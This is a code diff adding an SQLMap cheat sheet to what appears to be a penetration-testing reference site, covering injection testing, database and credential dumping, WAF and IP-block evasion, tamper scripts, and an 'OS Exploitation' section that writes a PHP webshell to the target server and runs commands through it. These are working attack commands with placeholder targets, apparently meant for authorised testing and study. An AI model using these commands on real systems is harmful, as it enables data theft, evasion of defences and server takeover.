@@ -854,7 +854,37 @@ NOTE: all the placeholders/columns must be satisfied. for columns use open and c
                   {
                     slug: "sqlmap",
                     title: "SQLMap",
-                    body: `# General Options
+                    body: `# Quick Reference
+
+| Flag | Description |  
+| --- | --- |  
+| -u [URL] | Target URL |  
+| --data '[data]' | POST data testing |  
+| -r req.txt | Use full HTTP request file (from Burp) |  
+| --batch | Skip prompts, use defaults |  
+| -p [param] | Narrow test to specific parameter |  
+| --dbs | Enumerate databases |  
+| -D [database] | Select target database |  
+| --tables | List tables in selected DB |  
+| -T [table] | Select target table |  
+| --dump | Dump table/database content |  
+| --current-db | Show current database name |  
+| --current-user | Show current DB user |  
+| --is-dba | Check for DBA privileges |  
+| -C [col1,col2] | Select specific columns to dump |  
+| --os-shell | Get OS command shell (if exploitable) |  
+| --random-agent | Bypass basic User-Agent blacklisting |  
+| --level=[1-5] | Increase test depth/vectors |  
+| --risk=[1-3] | Increase risk tolerance for payloads |  
+| --technique=[BEUST] | Restrict to specific SQLi techniques |  
+| --proxy [url] | Route traffic through Burp/proxy |  
+| --file-read [path] | Read a file from target server |  
+| --file-write / --file-dest | Upload webshell to target |  
+| --tamper=[script] | Apply WAF-evasion tamper script |  
+| --skip-waf | Skip WAF detection (less noise) |  
+| --cookie / -H | Custom cookie/header injection |
+
+# General Options
 
 | Flag | Description |  
 | --- | --- |  
@@ -879,12 +909,12 @@ NOTE: all the placeholders/columns must be satisfied. for columns use open and c
 
 ### POST Request
 
-<span class="cmd">--data</span> flag can be used: Data in quotes  
-<span class="cmd">sqlmap 'http://www.example.com/' --data 'uid=1&amp;name=test'</span>  
+<span class="cmd">--data '[data]'</span> flag can be used: Data in quotes  
+<span class="cmd">sqlmap -u '[TARGET_URL]' --data 'uid=1&amp;name=test'</span>  
 <span class="cmd">uid</span> and <span class="cmd">name</span> will be tested for SQLi vulnerability  
 We can narrow the tests to a specific parameter using <span class="cmd">*</span> or <span class="cmd">-p [param]</span>  
-<span class="cmd">sqlmap 'http://www.example.com/' --data 'uid=1*&amp;name=test'</span>  
-<span class="cmd">sqlmap 'http://www.example.com/' --data 'uid=1&amp;name=test' -p uid</span>
+<span class="cmd">sqlmap -u '[TARGET_URL]' --data 'uid=1*&amp;name=test'</span>  
+<span class="cmd">sqlmap -u '[TARGET_URL]' --data 'uid=1&amp;name=test' -p uid</span>
 
 ### Full HTTP Request
 
@@ -968,9 +998,9 @@ NOTE: To retrive content: <span class="cmd">--dump</span> must be used
 <span class="cmd">-T [table_name]</span>  
 <span class="cmd">-D [database_name]</span>  
 <span class="cmd">-C [col1, col2]</span>  
-<span class="cmd">sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb</span>  
+<span class="cmd">sqlmap -u "[TARGET_URL]?id=1" --dump -T users -D testdb</span>  
 Conditional: To retrieve certain rows based on a known WHERE condition (e.g. name LIKE 'f%')  
-<span class="cmd">sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"</span>
+<span class="cmd">sqlmap -u "[TARGET_URL]?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"</span>
 
 ## Full DB Enumeration
 
@@ -980,15 +1010,17 @@ Conditional: To retrieve certain rows based on a known WHERE condition (e.g. nam
 
 ## DB Schema Enumeration
 
-<span class="cmd">--schema</span> : Database architecture, desc command of SQL
+Database architecture, desc command of SQL  
+<span class="cmd">--schema</span>
 
 ## Search for Data
 
-<span class="cmd">--search</span> : Used to search for databases, tables or column names  
+Used to search for databases, tables or column names  
+<span class="cmd">--search</span>  
 Eg: Search for tables that contain the keyword user:  
-&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmd">sqlmap -u "http://www.example.com/?id=1" --search -T user</span>  
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmd">sqlmap -u "[TARGET_URL]?id=1" --search -T user</span>  
 &nbsp;&nbsp;&nbsp;&nbsp;Search for columns that contain the keyword user:  
-&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmd">sqlmap -u "http://www.example.com/?id=1" --search -C pass</span>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmd">sqlmap -u "[TARGET_URL]?id=1" --search -C pass</span>
 
 ## Password Enumeration
 
@@ -996,11 +1028,11 @@ Eg: Search for tables that contain the keyword user:
 
 • Search for colums containing keywords related to username and passwords  
 • Dump the table entries:  
-<span class="cmd">sqlmap -u "http://www.example.com/?id=1" --dump -D [database] -T [table]</span>
+<span class="cmd">sqlmap -u "[TARGET_URL]?id=1" --dump -D [database] -T [table]</span>
 
 ### System creds
 
-<span class="cmd">sqlmap -u "http://www.example.com/?id=1" --passwords --batch</span>
+<span class="cmd">sqlmap -u "[TARGET_URL]?id=1" --passwords --batch</span>
 
 # Bypassing Webapp Protections
 
@@ -1008,22 +1040,109 @@ Eg: Search for tables that contain the keyword user:
 
 Specify parameter name and it automatically parses response content and search for fresh tokens  
 <span class="cmd">--csrf-token="[token_parameter_name]"</span>  
-<span class="cmd">sqlmap -u "http://www.example.com/" --data="id=1&amp;[csrf-token]=[WfF1szMUHhiokx9AHFply5L2xAOfjRkE]" --csrf-token="[csrf-token]"</span>
+<span class="cmd">sqlmap -u "[TARGET_URL]" --data="id=1&amp;[csrf-token]=[WfF1szMUHhiokx9AHFply5L2xAOfjRkE]" --csrf-token="[csrf-token]"</span>
 
 ## Unique Value Bypass
 
 Some parameters must contain unique values in new requests that are sent  
 <span class="cmd">--randomize=["token_parameter_name"]</span>  
-<span class="cmd">sqlmap -u "http://www.example.com/?id=1&amp;[rp]=29125" --randomize=[rp</span>]
+<span class="cmd">sqlmap -u "[TARGET_URL]?id=1&amp;[rp]=29125" --randomize=[rp</span>]
 
 ## Calculated Parameter Bypass
 
 Sometimes a parameter's value is obtained after a calculation based on some other parameter.  
-<span class="cmd">--eval="[python_inline_code"</span> should be used, which evaluates valid Python code just before sending the request.  
-<span class="cmd">sqlmap -u "http://www.example.com/?id=1&amp;h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" </span>  
+<span class="cmd">--eval="[python_inline_code]"</span>   
+Evaluates valid Python code just before sending the request.  
+<span class="cmd">sqlmap -u "[TARGET_URL]?id=1&amp;h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" </span>  
 The paramter in the url or data field must match in the contents of <span class="cmd">--eval</span> flag.
 
-## IP Address Concealing`,
+## IP Address Concealing
+
+Can be used if webapp has protection mechanism that blacklists our IP address. Proxy or tor network can be used  
+Proxy can be set with <span class="cmd">--proxy</span> flag or a list or proxies can be passed with <span class="cmd">--proxy-file</span> flag along with a file of proxies  
+<span class="cmd">--proxy="socks4://177.39.187.70:33283"</span>  
+<span class="cmd">--proxy-file="[path_to_file]"</span>  
+For tor: SOCKS4 proxy service at the local port 9050 or 9150 should be there. Use the switch <span class="cmd">--tor</span>
+
+## WAF Bypass
+
+To skip testing for existence of a WAF:   
+<span class="cmd">--skip-waf</span>  
+Produces less noise.  
+SQLMap probes for WAF by injecting a malicious payload into a non-existent parameter (<span class="cmd">?pfov=...</span>). If WAF is present, the response differs significantly from baseline.  
+Eg: ModSecurity returns 406 Not Acceptable. To identify the specific WAF, SQLMap uses [identYwaf](https://github.com/stamparm/identYwaf), a third-party library containing signatures for 80+ WAF solutions.
+
+## User-agent Blacklisting Bypass
+
+In-case of immediate problems (HTTP <span class="cmd">5XX</span> error codes), cause: blacklisting of default user-agent used by SQLMap.  
+<span class="cmd">--random-agent</span>
+
+## Tamper Scripts
+
+Python scripts written for modifying requests just before being sent to the target.  
+<span class="cmd">--tamper=[script1],[script2]</span>  
+Most popular script: <span class="cmd">between</span>  
+List of all tamper scripts will be at the end of this page.
+
+## Splitting POST Request
+
+### Chunked transfer encoding
+
+<span class="cmd">--chunked</span>  
+Splits the <span class="cmd">POST</span> request's body into so-called "chunks." Blacklisted SQL keywords are split between chunks in a way that the request containing them can pass unnoticed.
+
+### HTTP Parameter Polution
+
+<span class="cmd">--hpp</span>  
+Payloads are split between different same parameter named values (Eg: <span class="cmd">?id=1&amp;id=UNION&amp;id=SELECT&amp;id=username,password&amp;id=FROM&amp;id=users...</span>), which are concatenated by the target platform if supporting it (Eg: <span class="cmd">ASP</span>).
+
+# OS Exploitation
+
+## Checking for DBA Privileges
+
+<span class="cmd">--is-dba</span>
+
+## Reading Local Files
+
+<span class="cmd">--file-read [file_path]</span>
+
+## Writing Local Files
+
+• Prepare basic webshell  
+<span class="cmd">echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php</span>  
+• Use --file-write and --file-dest to write the file to the server  
+<span class="cmd">sqlmap -u "[TARGET_URL]/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"</span>  
+• Access the remote file  
+<span class="cmd">curl http://[TARGET_URL]/shell.php?cmd=ls+-la</span>
+
+## OS Command Execution
+
+<span class="cmd">--os-shell</span>
+
+# Full Tamper script list
+
+| Tamper-Script | Description |  
+| --- | --- |  
+| 0eunion | Replaces instances of  UNION with e0UNION |  
+| base64encode | Base64-encodes all characters in a given payload |  
+| between | Replaces greater than operator (&gt;) with NOT BETWEEN 0 AND # and equals operator (=) with BETWEEN # AND # |  
+| commalesslimit | Replaces (MySQL) instances like LIMIT M, N with LIMIT N OFFSET M counterpart |  
+| equaltolike | Replaces all occurrences of operator equal (=) with LIKE counterpart |  
+| halfversionedmorekeywords | Adds (MySQL) versioned comment before each keyword |  
+| modsecurityversioned | Embraces complete query with (MySQL) versioned comment |  
+| modsecurityzeroversioned | Embraces complete query with (MySQL) zero-versioned comment |  
+| percentage | Adds a percentage sign (%) in front of each character (e.g. SELECT -&gt; %S%E%L%E%C%T) |  
+| plus2concat | Replaces plus operator (+) with (MsSQL) function CONCAT() counterpart |  
+| randomcase | Replaces each keyword character with random case value (e.g. SELECT -&gt; SEleCt) |  
+| space2comment | Replaces space character ( ) with comments \`/ |  
+| space2dash | Replaces space character ( ) with a dash comment (--) followed by a random string and a new line (\\\\n) |  
+| space2hash | Replaces (MySQL) instances of space character ( ) with a pound character (#) followed by a random string  and a new line (\\\\n) |  
+| space2mssqlblank | Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters |  
+| space2plus | Replaces space character ( ) with plus (+) |  
+| space2randomblank | Replaces space character ( ) with a random blank character from a valid set of alternate characters |  
+| symboliclogical | Replaces AND and OR logical operators with their symbolic counterparts (&amp;&amp; and ||) |  
+| versionedkeywords | Encloses each non-function keyword with (MySQL) versioned comment |  
+| versionedmorekeywords | Encloses each keyword with (MySQL) versioned comment |`,
                   },
                 ],
               },
